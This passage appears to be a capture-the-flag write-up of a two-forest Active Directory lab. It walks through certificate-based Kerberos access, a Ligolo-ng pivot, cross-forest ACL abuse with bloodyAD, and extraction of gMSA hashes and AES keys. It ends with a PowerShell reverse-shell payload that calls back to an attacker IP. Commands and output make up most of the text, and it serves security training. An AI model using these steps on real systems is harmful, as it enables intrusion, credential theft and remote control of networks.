[*] Saving credential cache to 'c.roberts.ccache'
File 'c.roberts.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'c.roberts.ccache'
[*] Trying to retrieve NT hash for 'c.roberts'
[*] Got hash for 'c.roberts@ping.htb': aad3b435b51404eeaad3b435b51404ee:2475be69d40e815588a85fd89c7a439d
```

Certipy successfully obtains a fresh TGT and — as a side effect of the PKINIT exchange — recovers the account's **NT hash** as well. Certificate authentication is often stronger than it looks: even in NTLM-disabled environments, a valid certificate can still be used to bootstrap Kerberos credentials that carry the effective rights of whatever group the certificate's issuance policy points to.

## Landing a Shell as C.Roberts

With a working `.ccache`, we authenticate to WinRM via Evil-WinRM — successfully this time, because the certificate's issuance policy is granting us `TempWinRMAccess`.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ evil-winrm -i dc1.ping.htb -r PING.HTB
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Roberts\Documents>
```

# Phase 5 — Post-Exploitation on DC1 and Discovering PONG.HTB

## Privileges, Groups, and the gMSA Clue

Now that we have an interactive shell, we check exactly what our foothold gives us.

```powershell
*Evil-WinRM* PS C:\Users\C.Roberts\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\C.Roberts\Documents> 
*Evil-WinRM* PS C:\Users\C.Roberts\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
PING\TempWinRMAccess                        Group            S-1-5-21-750635624-2058721901-1932338391-2602 Mandatory group, Enabled by default, Enabled group
PING\IT                                     Group            S-1-5-21-750635624-2058721901-1932338391-2618 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization Certificate  Well-known group S-1-5-65-1                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

`SeMachineAccountPrivilege` stands out among the enabled privileges — it allows the account to join new computers to the domain, which is often abused in delegation attacks, though here `MachineAccountQuota` will later turn out to be `0`, closing that door. More usefully, `whoami /groups` confirms our token really does carry `PING\TempWinRMAccess` (proving the ESC13 certificate worked as intended) as well as `PING\IT`, the group BloodHound already flagged as interesting.

Browsing `C:\Users` for other local profiles turns up something unexpected:

```powershell
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/16/2026   9:15 PM                Administrator
d-----         8/31/2026   3:44 PM                C.Roberts
d-----         4/11/2026   6:41 AM                Pong_gMSA$
d-r---         6/15/2025  12:59 PM                Public
```

The `Pong_gMSA$` account — with its `$` suffix and cross-domain-sounding name — is a **Group Managed Service Account (gMSA)**. gMSAs have their (very long, random) passwords rotated automatically by Active Directory, and only explicitly authorized principals are allowed to read that password. The fact that a `PONG`-named gMSA has a local profile on `PING`'s domain controller is a strong signal that this account is meant to be our bridge between the two forests.

## Locating the Internal Network

Since `PONG.HTB` should exist somewhere on the network, we check DC1's network interfaces.

```powershell
*Evil-WinRM* PS C:\Users> ipconfig

Windows IP Configuration


Ethernet adapter vEthernet (Switch01):

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.2.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 0.0.0.0

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.245.56
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1
```

There's a second interface on `192.168.2.0/24` that isn't reachable from our attacking box. A quick PowerShell ping sweep confirms there's a live host besides DC1 itself:

```powershell
*Evil-WinRM* PS C:\Users> 1..254 | ForEach-Object {
    $ip = "192.168.2.$_"
    $result = ping -n 1 -w 300 $ip 2>$null
    if ($result -match "TTL=") {
        Write-Host "$ip is alive"
    }
}
192.168.2.1 is alive
192.168.2.2 is alive
```

`192.168.2.1` is DC1's own internal interface, so `192.168.2.2` is the interesting one — very likely the `PONG.HTB` domain controller.

# Phase 6 — Pivoting into the Internal Network with Ligolo-ng

## Setting up the Tunnel

`192.168.2.2` is only reachable from inside DC1's network, so we need a pivot. **Ligolo-ng** solves this by running a lightweight agent on the compromised host that tunnels traffic back to a proxy on our attacking machine, which then exposes a virtual network interface we can route through like any other NIC.

We start the proxy locally with a self-signed certificate:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ sudo ligolo-proxy -selfcert         
[sudo] password for kuroshiro: 
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? No
WARN[0002] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0002] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0002] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _                                                                
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                                                
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                                                 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                  
        /____/                          /____/                                                                   
                                                                                                                 
  Made in France ♥            by @Nicocha30!                                                                     
  Version: dev                                                                                                   
                                                                                                                 
ligolo-ng » 
```

Next, we create a virtual TUN interface and add a route for the internal subnet through it.

```shell
ligolo-ng » ifcreate --name pingpong
INFO[0086] Creating a new pingpong interface...         
INFO[0086] Interface created!                           
ligolo-ng » route_add --name pingpong --route 192.168.2.0/24
INFO[0103] Route created.   
```

We then upload the agent binary through our existing Evil-WinRM session and run it on DC1, pointing it back at our proxy (`-ignore-cert` accepts the proxy's self-signed certificate).

```powershell
*Evil-WinRM* PS C:\Temp> upload agent.exe
                                        
Info: Uploading /home/kuroshiro/HTB/PingPong/agent.exe to C:\Temp\agent.exe
                                        
Data: 14677332 bytes of 14677332 bytes copied
                                        
Info: Upload successful!
```

```powershell
*Evil-WinRM* PS C:\Temp> ./agent.exe -connect 10.10.14.32:11601 -ignore-cert
```

The proxy picks up the incoming session, and we bind it to the `pingpong` tunnel interface:

```shell
ligolo-ng » INFO[0395] Agent joined.                                 id=00155d168601 name="PING\\C.Roberts@dc1" remote="10.129.245.56:60427"                                                                                      
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - PING\C.Roberts@dc1 - 10.129.245.56:60427 - 00155d168601
[Agent : PING\C.Roberts@dc1] » start --tun pingpong
INFO[0430] Starting tunnel to PING\C.Roberts@dc1 (00155d168601) 
```

A ping to `192.168.2.2` confirms the pivot is live:

```shell
┌──(kuroshiro㉿a1sberg)-[~/ligolo-ng]
└─$ ping 192.168.2.2
PING 192.168.2.2 (192.168.2.2) 56(84) bytes of data.
64 bytes from 192.168.2.2: icmp_seq=1 ttl=64 time=91.4 ms
64 bytes from 192.168.2.2: icmp_seq=2 ttl=64 time=89.4 ms
64 bytes from 192.168.2.2: icmp_seq=3 ttl=64 time=80.8 ms
```

## Scanning DC2

With traffic flowing through the tunnel, we scan the internal host directly from our attacking machine.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ nmap -A -T5 192.168.2.2
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-31 19:08 EDT
Nmap scan report for 192.168.2.2
Host is up (0.051s latency).
Not shown: 987 filtered tcp ports (no-response)
Bug in ms-sql-ntlm-info: no string output.
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-31 23:08:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pong.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   192.168.2.2:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-31T22:04:21
|_Not valid after:  2056-08-31T22:04:21
|_ssl-date: 2026-08-31T23:09:10+00:00; 0s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: pong.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Timing level 5 (Insane) used
No OS matches for host
Service Info: Host: DC2; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-31T23:08:29
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC2, NetBIOS user: <unknown>, NetBIOS MAC: 00:15:5d:16:86:02 (Microsoft)

TRACEROUTE
HOP RTT      ADDRESS
1   50.93 ms 192.168.2.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.54 seconds
```

`192.168.2.2` is confirmed as `DC2`, the domain controller for `pong.htb`. Alongside the standard AD services, port **1433 (MSSQL)** stands out immediately — SQL Server is a well-known avenue for both lateral movement and privilege escalation, particularly once `xp_cmdshell` enters the picture, which it will later in this writeup. As before, SMB signing is required and NTLM is disabled, so all subsequent access to DC2 will also go through Kerberos.

We add `DC2.pong.htb` to `/etc/hosts` and generate a matching `krb5.conf` for the `PONG.HTB` realm:

```shell
┌──(kuroshiro㉿a1sberg)-[~/ligolo-ng]
└─$ nxc smb 192.168.2.2 --generate-krb5-file ./krb5dc2.conf
SMB         192.168.2.2     445    DC2              [*]  x64 (name:DC2) (domain:pong.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         192.168.2.2     445    DC2              [+] krb5 conf saved to: ./krb5dc2.conf
SMB         192.168.2.2     445    DC2              [+] Run the following command to use the conf file: export KRB5_CONFIG=./krb5dc2.conf
```

# Phase 7 — Cross-Forest Enumeration of PONG.HTB

## Kerberos Configuration for Two Realms

Rather than juggling two separate `krb5.conf` files, we merge both realms into a single configuration.

```text
[libdefaults]
dns_lookup_kdc = false
dns_lookup_realm = false
default_realm = PING.HTB
ticket_lifetime = 24h
renew_lifetime = 7d
forwardable = true

[realms]
PING.HTB = {
    kdc = dc1.ping.htb
    admin_server = dc1.ping.htb
    default_domain = ping.htb
}

PONG.HTB = {
    kdc = dc2.pong.htb
    admin_server = dc2.pong.htb
    default_domain = pong.htb
}

[domain_realm]
.ping.htb = PING.HTB
ping.htb = PING.HTB
.pong.htb = PONG.HTB
pong.htb = PONG.HTB
```

The `[realms]` block tells Kerberos-aware tools where to find the KDC for each forest, and `[domain_realm]` maps hostnames to the correct realm. With both defined side by side, a single `KRB5_CONFIG` export lets our tooling resolve the right KDC regardless of which domain we're currently targeting — essential for anything that needs to cross the trust boundary.

```shell
┌──(kuroshiro㉿a1sberg)-[~/ligolo-ng]
└─$ export KRB5_CONFIG=./krb5.conf
```

We confirm cross-realm ticketing works by requesting a service ticket for LDAP on DC2 using our existing `PING.HTB` TGT.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ kvno ldap/dc2.pong.htb
ldap/dc2.pong.htb@PING.HTB: kvno = 6
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ klist                 
Ticket cache: FILE:c.roberts.ccache
Default principal: c.roberts@PING.HTB

Valid starting       Expires              Service principal
08/31/2026 18:42:06  09/01/2026 04:42:06  krbtgt/PING.HTB@PING.HTB
        renew until 09/01/2026 18:41:58
08/31/2026 18:44:51  09/01/2026 04:42:06  HTTP/dc1.ping.htb@PING.HTB
        renew until 09/01/2026 18:41:58
08/31/2026 18:51:10  09/01/2026 04:42:06  ldap/dc1.ping.htb@PING.HTB
        renew until 09/01/2026 18:41:58
08/31/2026 19:09:55  09/01/2026 04:42:06  ldap/dc2.pong.htb@PING.HTB
        renew until 09/01/2026 18:41:58
        Ticket server: ldap/dc2.pong.htb@PONG.HTB
```

Our `c.roberts@PING.HTB` TGT stays intact, and a new ticket for `ldap/dc2.pong.htb` appears — issued for a `PING.HTB` client but serviced by `PONG.HTB`'s KDC. This is the cross-realm referral mechanism in action: the client-side principal never changes domains, but the trust relationship allows the *service* ticket to be honored by the other forest.

With cross-domain LDAP access confirmed, we run RustHound-CE against `PONG.HTB` as well.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ rusthound-ce -d pong.htb -u c.roberts@ping.htb -k -f dc2.pong.htb -i 192.168.2.2 -n 192.168.2.2 --dns-tcp -z
---------------------------------------------------
Initializing RustHound-CE at 19:10:56 on 08/31/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-08-31T23:10:56Z INFO  rusthound_ce] Verbosity level: Info
[2026-08-31T23:10:56Z INFO  rusthound_ce] Collection method: All
[2026-08-31T23:10:57Z INFO  rusthound_ce::ldap] Connected to PONG.HTB Active Directory!
[2026-08-31T23:10:57Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-08-31T23:10:57Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-08-31T23:11:01Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=pong,DC=htb
[2026-08-31T23:11:01Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-08-31T23:11:03Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=pong,DC=htb
[2026-08-31T23:11:03Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-08-31T23:11:03Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=pong,DC=htb
[2026-08-31T23:11:03Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-08-31T23:11:03Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=pong,DC=htb
[2026-08-31T23:11:03Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-08-31T23:11:10Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=pong,DC=htb
[2026-08-31T23:11:10Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-08-31T23:11:10Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-08-31T23:11:10Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-08-31T23:11:10Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-08-31T23:11:10Z INFO  rusthound_ce::modules::sessions] [sessions] 0 active target(s) after expiry/enabled filter
[2026-08-31T23:11:10Z INFO  rusthound_ce::modules::sessions] [sessions] 0 session(s) enumerated in total across 0 host(s)
[2026-08-31T23:11:10Z INFO  rusthound_ce::json::maker::common] 19 users parsed!
[2026-08-31T23:11:10Z INFO  rusthound_ce::json::maker::common] 64 groups parsed!
[2026-08-31T23:11:10Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-08-31T23:11:10Z INFO  rusthound_ce::json::maker::common] 2 ous parsed!
[2026-08-31T23:11:10Z INFO  rusthound_ce::json::maker::common] 2 domains parsed!
[2026-08-31T23:11:10Z INFO  rusthound_ce::json::maker::common] 3 gpos parsed!
[2026-08-31T23:11:10Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
...
```

## BloodHound Findings: IT Owns gMSA Managers

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FtabhMiXCJo9kxscqTloN%252FScreenshot%2520%283201%29.png%3Falt%3Dmedia%26token%3Db4d8e2a8-3b65-409a-9991-f0ac83f3d478&width=768&dpr=3&quality=100&sign=fe3053c9a3e030bbd7bc790618f14bfb&sv=3)

This is where the two-forest structure becomes actionable. `c.roberts` is already a member of `IT@PING.HTB`, and BloodHound shows that **IT owns** `gMSA Managers@PONG.HTB` via an `OwnsRaw`/`WriteOwner` edge — an ownership relationship that reaches across the trust boundary.

That ownership matters because `gMSA Managers` itself holds **ReadGMSAPassword** over `PONG_GMSA$@PONG.HTB`. If we can turn our inherited ownership of `gMSA Managers` into *effective control* (ideally, membership) of that group, we inherit the ability to read the gMSA's managed password directly. There's also a second `ReadGMSAPassword` edge from the same group targeting `GMSA$@PING.HTB`, so the same privilege would work on the PING side too — but our immediate target is `Pong_gMSA$`, since that's the account with a foothold on DC1.

# Phase 8 — Abusing Group Scope Conversion to Read the gMSA Password

## Converting Ownership into Control

Owning an object in Active Directory doesn't automatically grant every permission over it — ownership mainly grants the right to modify the object's own ACL (`WriteDacl`), which we then use to grant ourselves broader rights. Because `c.roberts` belongs to `PING.HTB` and the target group belongs to `PONG.HTB`, tools like `bloodyAD` can't resolve the account by its plain username against the foreign domain — we address it by its **SID** instead, which uniquely identifies the account across the trust.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ bloodyAD --host dc2.pong.htb -d pong.htb -u c.roberts -k add genericAll 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' 'S-1-5-21-750635624-2058721901-1932338391-2617' 
[+] S-1-5-21-750635624-2058721901-1932338391-2617 has now GenericAll on CN=gMSA Managers,CN=Users,DC=pong,DC=htb
```

We now have `GenericAll` on the `gMSA Managers` group — full control over its properties, including membership and its `groupType` attribute.

## Global → Universal → Domain Local

Simply adding `c.roberts` to `gMSA Managers` might work on its own, but the writeup's approach goes a step further by converting the group's **scope**. The `groupType` attribute encodes both whether a group is security-enabled and its scope (Global, Universal, or Domain Local) as bit flags. The starting value `-2147483644` corresponds to `0x80000004` — `0x80000000` is the `SECURITY_ENABLED` flag and `0x00000004` marks a **Global Security Group**. Global groups can only contain members from their own domain, which is a real obstacle when the account we want to add (`c.roberts`) belongs to a different forest.

Active Directory won't let us jump directly from Global to Domain Local — that transition is disallowed and returns `ERROR_NOT_SUPPORTED`. It has to happen in two hops: **Global → Universal**, then **Universal → Domain Local**. Universal and Domain Local groups can both contain foreign security principals, which is exactly what we need.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ bloodyAD --host dc2.pong.htb -d pong.htb -u c.roberts -k set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v -2147483640 
[+] CN=gMSA Managers,CN=Users,DC=pong,DC=htb's groupType has been updated
```

Setting `groupType` to `-2147483640` (`0x80000008`) converts the group to **Universal**. From there, we complete the second hop to **Domain Local** (`-2147483644`, `0x80000004`):

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ bloodyAD --host dc2.pong.htb -d pong.htb -u c.roberts -k set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v -2147483644 
[+] CN=gMSA Managers,CN=Users,DC=pong,DC=htb's groupType has been updated
```

With the group now Domain Local, we add `c.roberts` as a member — again by SID, since the account is a foreign principal relative to `PONG.HTB`.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ bloodyAD --host dc2.pong.htb -d pong.htb -u c.roberts -k add groupMember 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' 'S-1-5-21-750635624-2058721901-1932338391-2617' 
[+] S-1-5-21-750635624-2058721901-1932338391-2617 added to CN=gMSA Managers,CN=Users,DC=pong,DC=htb
```

`c.roberts` is now an effective member of `gMSA Managers`, inheriting its `ReadGMSAPassword` right.

## Recovering the gMSA Secret

We refresh our TGT and query the gMSA password through NetExec's `--gmsa` option.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ impacket-getTGT 'PING.HTB/c.roberts:AssumedBreach123'    
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in c.roberts.ccache

┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ export KRB5CCNAME=c.roberts.ccache
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ nxc ldap dc2.pong.htb -d ping.htb -u c.roberts --use-kcache --gmsa
LDAP        dc2.pong.htb    389    DC2              [*] None (name:DC2) (domain:ping.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc2.pong.htb    389    DC2              [+] ping.htb\ from ccache 
LDAP        dc2.pong.htb    389    DC2              [*] Getting GMSA Passwords
LDAP        dc2.pong.htb    389    DC2              Account: Pong_gMSA$           NTLM: 9c3ee1ce05c0420598749668bda69074     PrincipalsAllowedToReadPassword: gMSA Managers
```

The query returns the NT hash for `Pong_gMSA$` and confirms `gMSA Managers` is listed under `PrincipalsAllowedToReadPassword`, proving the entire ownership → scope-conversion → membership chain worked as intended.

An NT hash alone won't get us everywhere, though — modern Kerberos prefers AES keys over RC4/NTLM, and some services or configurations may reject weaker encryption types outright. We pull the full key set with `ldeep`.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ ldeep ldap -u c.roberts -d ping.htb -k -s ldap://dc2.pong.htb gmsa
Pong_gMSA$:nthash:9c3ee1ce05c0420598749668bda69074
Pong_gMSA$:aes128-cts-hmac-sha1-96:13d374fcef1cf3403c9e5b90b1796e06
Pong_gMSA$:aes256-cts-hmac-sha1-96:ed68745b50de7045981c8199540ea1966ff84fb7f09f042cc227f6c114ef97e0
Pong_gMSA$:reader:gMSA Managers (group)
```

With the **AES256 key** in hand, we request a TGT directly for `Pong_gMSA$`.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ impacket-getTGT -dc-ip dc2.pong.htb -aesKey ed68745b50de7045981c8199540ea1966ff84fb7f09f042cc227f6c114ef97e0 'pong.htb/Pong_gMSA$'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Pong_gMSA$.ccache
```

We now hold valid Kerberos credentials for the managed service account itself.

# Phase 9 — Bypassing WinRM Restrictions with JEA and PSRP

## Discovering the JEA Configuration

A valid TGT for `Pong_gMSA$` doesn't automatically grant a WinRM shell — the account isn't a member of **Remote Management Users** or the custom `TemporaryWinRM` group, so plain Evil-WinRM access is blocked. Continuing to enumerate the filesystem instead:

```powershell
*Evil-WinRM* PS C:\Programdata> dir

    Directory: C:\Programdata

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/17/2026   3:41 AM                JEA
d---s-         6/15/2025   9:55 PM                Microsoft
d-----         6/16/2025   4:05 AM                Package Cache
d-----        11/28/2025   6:53 AM                Packages
d-----          1/1/2026   9:29 AM                regid.1991-06.com.microsoft
...
```

The `JEA` directory is the lead we need. **Just Enough Administration (JEA)** is a PowerShell feature for defining restricted, purpose-built remoting endpoints: instead of granting a full interactive PowerShell session, an administrator can expose a narrow, named endpoint that only allows a specific set of commands. Inside the directory is a session configuration file, `JEA.pssc`:

```powershell
@{

SchemaVersion = '2.0.0.0'

GUID = 'e26939b6-819a-496e-be9a-dfb45427c765'

# ConfigurationName = 'restricted'

Author = 'Administrator'

SessionType = 'RestrictedRemoteServer'
LanguageMode = 'ConstrainedLanguage'
}
```

The `SessionType` of `RestrictedRemoteServer` confirms this is indeed a constrained remoting endpoint, and `LanguageMode = 'ConstrainedLanguage'` further limits what PowerShell language features are available inside the session. The commented-out `ConfigurationName = 'restricted'` line tells us the endpoint's name — `restricted` — which is what we'll need to target explicitly.

This explains the earlier dead end: `Pong_gMSA$` isn't meant to use the *default* WinRM endpoint at all. It's meant to connect to this specific, named endpoint, which carries its own set of permissions independent of standard Remote Management group membership. Standard tools like Evil-WinRM only ever try the default endpoint, so they can't see this path — we need to speak the **PowerShell Remoting Protocol (PSRP)** directly and ask for the `restricted` configuration by name.

## Connecting to the Restricted Endpoint

Before attempting the connection, we tweak our Kerberos config for this multi-realm environment. By default, Kerberos tools may try to canonicalize hostnames, which can interfere with SPN matching across two different domains. Disabling that behavior avoids subtle authentication failures:

```text
dns_canonicalize_hostname = false
```

We also verify that `Pong_gMSA$` can obtain a cross-realm service ticket into `PING.HTB`, since the JEA endpoint lives on DC1 while the account belongs to `PONG.HTB`.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ kvno HTTP/dc1.ping.htb  
HTTP/dc1.ping.htb@PING.HTB: kvno = 7
```

With cross-realm ticketing confirmed, we use **pypsrp**, a Python implementation of PSRP, to connect. Unlike WinRM clients that only talk to the default endpoint, pypsrp lets us open a `RunspacePool` against a *named* session configuration.

```python
import os
from pypsrp.wsman import WSMan

os.environ.update({
    "KRB5CCNAME": "Pong_gMSA$.ccache",
    "KRB5_CONFIG": "./krb5.conf"
})

wsman = WSMan(
    "dc1.ping.htb",
    port=5985,
    ssl=False,
    auth="kerberos",
    encryption="auto",
    no_proxy=True,
    negotiate_service="HTTP"
)

t = wsman.transport
print(wsman.__dict__)
print(t.__dict__)
print(getattr(t, "endpoint", None), getattr(t, "server", None),
      getattr(t, "port", None), getattr(t, "ssl", None))
```

This script points the environment at the `Pong_gMSA$` ticket cache and our combined `krb5.conf`, then opens a `WSMan` session against `dc1.ping.htb` over Kerberos. Printing the internal state lets us confirm the connection parameters before trying to run anything.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ python3 testing.py
{'session_id': 'd8f7a912-8d7d-4a02-8fef-8315d8bf1761', 'locale': 'en-US', 'data_locale': 'en-US', 'transport': <pypsrp.wsman._TransportHTTP object at 0x7fea34914ec0>, 'max_envelope_size': 153600, 'operation_timeout': 20, 'max_payload_size': 113949}
{'server': 'dc1.ping.htb', 'port': 5985, 'username': None, 'password': None, 'ssl': False, 'path': 'wsman', 'auth': 'kerberos', 'cert_validation': True, 'connection_timeout': 30, 'read_timeout': 30, 'reconnection_retries': 0, 'reconnection_backoff': 2.0, 'wrap_required': True, 'encryption': None, 'proxy': None, 'no_proxy': True, 'certificate_key_pem': None, 'certificate_pem': None, 'credssp_auth_mechanism': None, 'credssp_disable_tlsv1_2': None, 'credssp_minimum_version': None, 'negotiate_delegate': None, 'negotiate_hostname_override': None, 'negotiate_send_cbt': None, 'negotiate_service': 'HTTP', 'endpoint': 'http://dc1.ping.htb:5985/wsman', 'session': None}
http://dc1.ping.htb:5985/wsman dc1.ping.htb 5985 False
```

The output confirms:

* The WinRM endpoint is `http://dc1.ping.htb:5985/wsman`
* Traffic is plain HTTP (WinRM often runs unencrypted at the transport layer and relies on Kerberos message-level encryption instead)
* Kerberos authentication with negotiate service `HTTP` is active

## Catching a Shell as Pong_gMSA$

With connectivity verified, we build a reverse-shell payload and Base64-encode it (as UTF-16LE, the encoding PowerShell's `-EncodedCommand` expects).

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/PingPong]
└─$ python3 -c '
import base64, sys
ip = "10.10.14.32" 
port = "443"      
payload = f"""$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
print(base64.b64encode(payload.encode("utf-16le")).decode())
'
